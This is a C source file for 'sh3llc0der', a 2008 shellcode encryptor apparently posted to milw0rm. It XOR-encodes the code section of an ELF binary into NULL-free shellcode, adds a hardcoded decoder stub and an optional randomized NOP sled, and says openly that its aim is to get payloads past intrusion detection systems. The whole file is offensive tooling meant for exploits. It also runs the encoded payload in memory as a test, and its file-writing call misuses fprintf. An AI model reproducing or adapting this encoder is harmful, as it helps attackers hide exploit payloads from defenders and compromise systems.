/*
*       sm4x - 2008 => sm4x0rcist [a7] gmail [d07] com
*       - sh3llc0der.c v0.1 (beta)
*       - (elf binary) shellcode encryptor, NULL free for IDS payload bypassing
*       - key is a simple int for x(x(p)) decryption(encryption(p)) (modify to add/subtract if needed)
*       - if you find bugs i dont wanna know -> fix them and its urs
*       - watch for 0x0a, 0x0d warnings for \r\n as they get mucked in most str** calls
*
*       nb: nasm ur files with -felf, then ld -o them (u know)
*       usage: ./sh3llc0der [options] binaryfile
*       - output is a encoded byte array (or raw binary if -o <file> is specified)
*       - it was easier for me to write it directly hooking to the elf struct -> but you can change it (only took 3 hours so ITS BUGGY!)
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <linux/elf.h>

char decoder[] = "\xeb\x10\x5e\x31\xc9"
                                 "\xb1\x00\x80\x74\x0e" // \x00 location of payload size
                                 "\xff\x00\xfe\xc9\x75" // \x00 location of xor key
                                 "\xf7\xeb\x05\xe8\xeb"
                                 "\xff\xff\xff";

int getkey(int i) {
        int seed;
        struct timeval tm;
        gettimeofday(&tm, NULL);
        seed = tm.tv_sec + tm.tv_usec; srandom(seed);
        return (random() % i) +1;
}

void usage() {
        printf("Usage: sh3llc0der [options] shellcode\n");
        printf("\tv - verbose\n");
        printf("\to [outfile] - out file (stdout is default)\n");
        printf("\tn [size] - generate with NOP sled of size length (minus decoder)\n");
        printf("\tr     - randomize NOP sled with other operations\n");
        printf("\t? - this crud\n");
}

int main(int argc, char **argv) {
        Elf32_Ehdr elfhdr; Elf32_Phdr dataseg; Elf32_Phdr txtseg;

        int found_txt_seg = 0;  int i = 0; int r = 0; int len = 0; int key = 0;
        int include_noop_instructions = 0; int noop_length = 0; int use_nop_randomization = 0;
        int write_file = 0;  int is_verbose = 0;
        unsigned char c; unsigned char *b = NULL; unsigned char *nb = NULL;
        char *upayload = NULL; char *outfile = NULL;
        unsigned int payload_offset = 0; unsigned int payload_size = 0;
        int (*func)();

        opterr = 0; int option = 1;
        while((option = getopt(argc, argv, "vrn:o:?")) != -1 ) {
                switch(option) {
                        case 'v':
                                is_verbose = 1;
                        break;
                        case 'o':
                                write_file = 1;
                                outfile = optarg;
                                if(outfile != NULL) { printf("[+] writing shellcode to: %s\n", outfile); }
                        break;
                        case 'n':
                                if(optarg != NULL) noop_length = atoi(optarg); else break;
                                include_noop_instructions = 1;
                        break;
                        case 'r':
                                use_nop_randomization = 1;
                        break;
                        case '?':
                                usage(); exit(0);
                        break;
                        default:
                                // nothing
                        break;
                };
        }

        if(argc < 2) { usage(); exit(0); }
        printf("[+] sh3llc0der - sm4x 2008\n");

        upayload = argv[argc-1]; if(upayload == outfile) { printf("[-] ummm no\n"); usage(); exit(-1); }

        if(is_verbose) { printf("[?] opening %s\n", upayload); }
        FILE *p = fopen(upayload, "rb");
        if(p == NULL) { printf("[-] null file - nice try\n"); exit(-1); }

        fseek(p, 0, SEEK_END);
        len = ftell(p); rewind(p);
        if(len <= 0) { printf("[-] 0 len file - nice try\n"); exit(-1); }

        /* adjust our noop length for the decoder size */

		if(include_noop_instructions && noop_length > sizeof(decoder)) { noop_length -= sizeof(decoder); }
        printf("[+] shellcode length: %d Bytes\n", len);

        b = (char *) malloc(sizeof(char)*len);
        if(b == NULL) { printf("[-] unable to buffer shellcode - nice try again!\n"); exit(-1); }

        if(is_verbose) { printf("[?] reading %s....\n", upayload); }
        r = fread(b, 1, len, p);
        if(r != len) { printf("[-] **warning** - unable to load the entire file into buffer!\n"); }
        fclose(p); p = NULL;
        if(is_verbose) { printf("[?] file %s seems ok with %d size\n", upayload, len); }

        /* get our ELF header out of the binary */
        memcpy(&elfhdr, (void *)b, sizeof(Elf32_Ehdr));

        printf("[+] Starting address: 0x%x\n", elfhdr.e_entry);
        /* seek to our offset */
        printf("[+] Offset @ 0x%x\n", elfhdr.e_phoff);

        /* loop for seg offset (you're gonna crash here if its not a proper elf binary -> don't really care!! lol) */
        for(i = 0;i < elfhdr.e_phnum; i++) {
                /* copy in our txtseg what we think* to be the appropriate header (p_offset == 0 means text) */
                memcpy(&txtseg, &b[(sizeof(Elf32_Ehdr)) + (i * sizeof(Elf32_Phdr))], sizeof(Elf32_Phdr));
                if(txtseg.p_filesz > 0 && txtseg.p_offset == 0) {
                        printf("[+] .text segment found, len: 0x%x|0x%x @ V:0x%x P:0x%x off: 0x%x\n",
                                txtseg.p_filesz, txtseg.p_memsz, txtseg.p_vaddr, txtseg.p_vaddr, txtseg.p_offset);
                        found_txt_seg  = 1; break;
                } else {
                        found_txt_seg = 0;
                }
        } if(!found_txt_seg) { printf("[-] could not find .text segment for encoding!\n"); exit(-1); }

        /* calculations for start of .text with offset (usually 0) */
        payload_size = (txtseg.p_vaddr + txtseg.p_filesz) - elfhdr.e_entry;
    payload_offset = (txtseg.p_offset + txtseg.p_filesz) - payload_size;

        printf("[+] calc offset: 0x%x | 0x%x -> (SHELLCODE SIZE: %d Bytes)\n", payload_offset, payload_size, payload_size);

        int new_payload_size = noop_length+payload_size+sizeof(decoder)-1;

        nb = (char *) malloc(sizeof(char) * new_payload_size);
        if(nb == NULL) { printf("[-] error creating copy payload - nice try\n"); exit(-1); }
        memset(nb, 0x0, sizeof(char) * new_payload_size); // just in case - clean it out

        // ensure we have a NULL free xor'd shellcode -> keep trying until we do
        int is_null = 0; int warn = 0; int attempts = 0;
        while(1) {
                if(attempts > 20) { printf("[-] somthing is very wrong!! please check the binary\n"); exit(-1); }
                key = getkey(255);
                for(i = 0; i < payload_size; i++) {
                        c = b[payload_offset+i]; c ^= key;
                        if(c == 0x00) { printf("[!] ERR: 0x%x on key: %d\n",  b[payload_offset+i], key);   is_null = 1; break; }
                        if(c == 0x0a || c == 0x0d) { printf("[!] WARN: 0x%x on key: %d\n",  b[payload_offset+i], key);  warn =1; }
                } attempts++;
                if(is_null) { printf("[-] NULL found.. regenerating now... try=%d\n", attempts); is_null = 0; usleep(100); continue; }

                if(warn) { printf("[!] WARN: invalid hex was found in this shellcode -> this may* not pass some string functions!\n"); }
                if(is_verbose) { printf("[?] running xor-enc on payload now (key=%d @ %x attempts)...\n", key, attempts); }

                /* fill our new buffer -nb*/
                for(i = 0; i < payload_size; i++) {
                        nb[noop_length+sizeof(decoder)-1+i] = b[payload_offset+i];
                        if(is_verbose) { printf("\\x%.2x", b[payload_offset+i]); }
                        nb[noop_length+sizeof(decoder)-1+i] ^= key;
                } break;
        } if(is_verbose) { printf("\n"); }
        if(!warn) { printf("[+] done xor-enc on payload (NULL FREE)...\n"); } else { printf("[!] (check warnings!!) some problems with xor-enc (NULL FREE)...\n"); }

        for(i = 0; i < noop_length+payload_size-1; i++) printf("\\x%.2x", nb[sizeof(decoder)+i]);

        /* we need to set our primary instructions to decode with xor */
        decoder[6] = payload_size; decoder[11] = key;

        printf("\n");
        if(include_noop_instructions) {
                printf("[+] prepending %d (%d = minus decoder len) NOOPs...\n", noop_length+sizeof(decoder), noop_length);
                // minus the decoder size
                if(use_nop_randomization) {
                        for(i = 0; i < noop_length; i++) {
                                int p = getkey(5);
                                // hardly random - but change to modify the primary sled sig
                                switch((int)p) {
                                        case 1: nb[i] = 0x90; break;
                                        case 2: nb[i] = 0x40; nb[i+1] = 0x48; i++; break;
                                        case 3: nb[i] = 0x50; break;
                                        case 4: nb[i] = 0x58; break;
                                        case 5: nb[i] = 0x99; break;
                                        default: nb[i] = 0x90; break;
                                };
                        }
                } else {
                        for(i = 0; i < noop_length; i++) nb[i] = 0x90;
                }
        }

        printf("[+] adding decoder of %d Bytes (total= %d Bytes)...\n", sizeof(decoder), sizeof(decoder)+payload_size);
        memcpy(nb+noop_length, decoder, sizeof(decoder)-1);
        for(i = 0; i < noop_length+payload_size+sizeof(decoder)-1; i++) printf("\\x%.2x", nb[i]);
        printf("\n");

        if(write_file) {
                printf("[+] writing payload to: %s\n", outfile);
                FILE *w = fopen(outfile, "wb");
                if(w == NULL) { printf("[-] Unable to open file: %s\n", outfile); goto continue_test; }
                int bytes = fprintf(w, nb, sizeof(decoder)+payload_size, 0);
                fclose(w);
                printf("[+] done %d written.\n", bytes);
        }

        continue_test:
        printf("[+] testing payload now ...\n");
        printf("[-] if shellcode tests bad something has gone horribly wrong - do NOT continue with payload...\n");

        /* if this mashes out ie: seg fault -> then DO NOT use the shellcode on an exploit -> ur gonna crash the shit */
        func = (int (*)()) nb;
        (int)(*func)();

        // should never get here really

        cleanup:
                if(p != NULL) fclose(p);
        return 0;
}

// milw0rm.com [2008-12-09]